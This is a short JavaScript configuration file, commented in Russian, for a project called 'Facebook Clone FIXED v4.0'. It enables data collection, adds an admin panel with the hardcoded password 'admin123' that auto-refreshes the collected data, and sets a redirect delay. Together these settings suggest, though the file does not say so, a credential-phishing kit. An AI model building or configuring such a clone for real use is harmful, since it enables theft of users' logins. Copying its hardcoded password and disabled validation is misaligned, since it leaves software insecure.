// config.js - НАСТРОЙКИ ПРОЕКТА
console.log('⚙️ Загрузка CONFIG...');

const CONFIG = {
    PROJECT_NAME: 'Facebook Clone FIXED v4.0',
    VERSION: '4.0.0',
    
    // Сбор данных
    COLLECT_DATA: true,
    SAVE_TO_LOCALSTORAGE: true,
    
    // Админка
    ADMIN_PASSWORD: 'admin123',
    AUTO_REFRESH_DATA: true,
    REFRESH_INTERVAL: 5000,
    
    // Задержки
    REDIRECT_DELAY: 1000,
    LOADING_DISPLAY_TIME: 800,
    
    // Отладка
    DEBUG_MODE: true,
    SKIP_VALIDATION: true,
    AUTO_CREATE_ACCOUNT: true
};

// Глобальный экспорт
window.CONFIG = CONFIG;
console.log('✅ CONFIG загружен:', CONFIG.PROJECT_NAME);
